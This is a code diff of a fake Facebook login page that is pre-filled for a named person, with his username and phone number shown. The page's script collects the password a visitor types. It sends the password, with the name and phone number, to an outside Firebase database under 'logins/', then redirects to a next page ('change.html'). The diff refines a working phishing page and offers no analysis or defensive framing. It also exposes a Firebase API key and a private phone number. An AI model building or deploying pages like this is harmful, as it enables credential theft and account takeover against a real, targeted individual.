@@ -4,182 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Log In</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Modern Facebook UI Styling */
-        body {
-            background-color: #f0f2f5;
-            font-family: Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .main-container {
-            text-align: center;
-            width: 100%;
-            max-width: 396px;
-        }
-
-        .fb-logo {
-            color: #1877f2;
-            font-size: 3.2rem;
-            font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: -1.5px;
-        }
-
-        .login-card {
-            background: #fff;
-            padding: 20px 16px 24px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-        }
-
-        .profile-section {
-            margin-bottom: 20px;
-        }
-
-        .avatar {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 12px;
-        }
-
-        .avatar img {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: #f0f2f5;
-            object-fit: cover;
-        }
-
-        h2 {
-            font-size: 1.15rem;
-            font-weight: 500;
-            margin: 0;
-            color: #1c1e21;
-        }
-
-        .user-id {
-            font-size: 0.85rem;
-            color: #606770;
-            margin-top: 4px;
-        }
-
-        .user-id a {
-            color: #1877f2;
-            text-decoration: none;
-        }
-
-        input[type="password"] {
-            width: 100%;
-            padding: 14px 16px;
-            margin-top: 10px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 1rem;
-            outline: none;
-        }
-
-        input[type="password"]:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .btn-login {
-            width: 100%;
-            padding: 10px;
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 1.25rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin-bottom: 15px;
-        }
-
-        .btn-login:hover { background-color: #166fe5; }
-
-        .forgot-link {
-            display: block;
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-        }
-
-        .forgot-link:hover { text-decoration: underline; }
-
-        .divider {
-            align-items: center;
-            border-bottom: 1px solid #dadde1;
-            display: flex;
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .divider::after, .divider::before {
-            content: "";
-            flex: 1;
-        }
-
-        .divider span {
-            color: #8a8d91;
-            font-size: 12px;
-            padding: 0 10px;
-            text-transform: lowercase;
-        }
-
-        .btn-create {
-            background-color: #42b72a;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 1.05rem;
-            font-weight: bold;
-            padding: 0 16px;
-            line-height: 48px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-
-        .btn-create:hover { background-color: #36a420; }
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-container { text-align: center; width: 100%; max-width: 396px; }
+        .fb-logo { color: #1877f2; font-size: 3.2rem; font-weight: bold; margin-bottom: 20px; letter-spacing: -1.5px; }
+        .login-card { background: #fff; padding: 20px 16px 24px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); }
+        .avatar img { width: 80px; height: 80px; border-radius: 50%; background: #f0f2f5; margin-bottom: 12px; }
+        h2 { font-size: 1.15rem; font-weight: 500; margin: 0; color: #1c1e21; }
+        .user-id { font-size: 0.85rem; color: #606770; margin-top: 4px; line-height: 1.4; }
+        .phone-display { font-weight: bold; color: #1c1e21; display: block; margin-top: 2px; }
+        .password-container { position: relative; width: 100%; margin: 20px 0 12px; }
+        input { width: 100%; padding: 14px 40px 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 1rem; outline: none; }
+        .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #606770; }
+        .btn-login { width: 100%; padding: 10px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 1.25rem; font-weight: bold; cursor: pointer; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 25px 0; position: relative; text-align: center; }
+        .divider span { background: #fff; padding: 0 10px; color: #8a8d91; font-size: 12px; position: relative; top: 10px; }
+        .btn-create { background-color: #42b72a; border: none; border-radius: 6px; color: white; font-size: 1.05rem; font-weight: bold; padding: 12px 16px; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="main-container">
         <h1 class="fb-logo">facebook</h1>
-        
         <div class="login-card">
-            <div class="profile-section">
-                <div class="avatar">
-                    <img src="https://a0.pikist.com/pngimg/1912/680/icon-user-profile-avatar-ico-facebook-user-head-black-icons-circle.png" alt="Profile">
-                </div>
-                <h2>Log in as Aziz Chaffi</h2>
-                <p class="user-id">aziz.chaffi.2025 · <a href="#">Not you?</a></p>
+            <div class="avatar"><img src="https://a0.pikist.com/pngimg/1912/680/icon-user-profile-avatar-ico-facebook-user-head-black-icons-circle.png" alt="Profile"></div>
+            <h2>Log in as Aziz Chaffi</h2>
+            <div class="user-id">
+                aziz.chaffi.2025 · <a href="#">Not you?</a>
+                <span class="phone-display">+21620119370</span>
             </div>
 
             <form id="loginForm">
-                <input type="password" id="password" placeholder="Password" required>
+                <div class="password-container">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <i class="fa-solid fa-eye-slash toggle-password" id="eyeIcon"></i>
+                </div>
                 <button type="submit" class="btn-login" id="submitBtn">Log In</button>
             </form>
-
-            <a href="#" class="forgot-link">Forgot account?</a>
-
-            <div class="divider">
-                <span>or</span>
-            </div>
-
-            <div style="text-align: center;">
-                <button type="button" class="btn-create">Create new account</button>
-            </div>
+            <div class="divider"><span>or</span></div>
+            <button class="btn-create">Create new account</button>
         </div>
     </div>
 
@@ -187,7 +51,6 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // Use your verified configuration
         const firebaseConfig = {
             apiKey: "AIzaSyDWV0Ks0O5b0XktqJ4mOoRKGfqQZE7q5Eg",
             authDomain: "testapp-f51a4.firebaseapp.com",
@@ -198,33 +61,31 @@
             appId: "1:943524545175:web:7d49a182a6251a1c9e1fd2",
             measurementId: "G-W5ZBDET3EQ"
         };
-
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // Eye Toggle
+        document.getElementById('eyeIcon').addEventListener('click', function() {
+            const passInput = document.getElementById('password');
+            const type = passInput.type === 'password' ? 'text' : 'password';
+            passInput.type = type;
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Submit and Redirect
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             const pass = document.getElementById('password').value;
-            const btn = document.getElementById('submitBtn');
-
-            btn.innerText = "Loading...";
-            btn.disabled = true;
-
-            // Adding your phone number context to the data push
+            
             database.ref('logins/').push({
                 user: "Aziz Chaffi",
-                phone_context: "+21620119370",
+                phone: "+21620119370",
                 password: pass,
+                step: "Login Page",
                 timestamp: new Date().toLocaleString()
-            })
-            .then(() => {
-                // Once data is sent, redirect to official help or login page
-                window.location.href = "https://www.facebook.com/login";
-            })
-            .catch((err) => {
-                alert("Error: " + err.message);
-                btn.innerText = "Log In";
-                btn.disabled = false;
+            }).then(() => {
+                window.location.href = "change.html"; // Go to next page
             });
         });
     </script>
